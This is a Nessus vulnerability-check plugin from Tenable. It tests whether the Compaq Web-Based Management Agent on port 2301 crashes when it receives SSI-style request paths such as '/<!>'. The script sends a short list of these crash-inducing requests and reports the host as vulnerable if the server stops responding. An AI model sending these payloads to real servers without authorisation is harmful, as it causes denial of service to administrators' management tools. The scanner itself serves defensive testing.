#
# (C) Tenable Network Security, Inc.
#

# References:
#
# Message-ID: <1003117.1055973914093.JavaMail.SYSTEM@sigtrap>
# Date: Thu, 19 Jun 2003 00:05:14 +0200 (CEST)
# From: Ian Vitek <ian.vitek@as5-5-7.bi.s.bonet.se>
# To: <vuln-dev@securityfocus.com>
# Subject: SSI vulnerability in Compaq Web Based Management Agent
#


include("compat.inc");

if(description)
{
 script_id(11980);
 script_version ("$Revision: 1.11 $");
 script_bugtraq_id(8014);
 script_xref(name:"OSVDB", value:"55095");

 script_name(english:"Compaq Web-Based Management Agent Remote Overflow DoS");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
"It was possible to kill the remote web server by requesting
something like: /<!>
This is probably a Compaq Web Enterprise Management server.

This flaw could be used to forbid you from managing your machines." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );
 script_set_attribute(attribute:"solution", value: "No solution is known at this time");
 script_end_attributes();


 script_summary(english: "<!> crashes Compaq Web Management Agent");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 2301);
 exit(0);
}

#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
 
port = get_http_port(default:2301, embedded: 1);
# Also on 2381 - HTTPS

if (http_is_dead(port: port)) exit(0);

# Just in case they just fix the first problem...
n = 0;
u[n++] = "/<!>";
u[n++] = "/<!.StringRedirecturl>";
u[n++] = "/<!.StringHttpRequest=Url>";
u[n++] = "/<!.ObjectIsapiECB>";
u[n++] = "/<!.StringIsapiECB=lpszPathInfo>";

for (i = 0; i < n; i ++)
{
  r = http_send_recv3(method:"GET", port: port, item: u[i]);
}

if (http_is_dead(port: port, retry: 3)) security_warning(port);
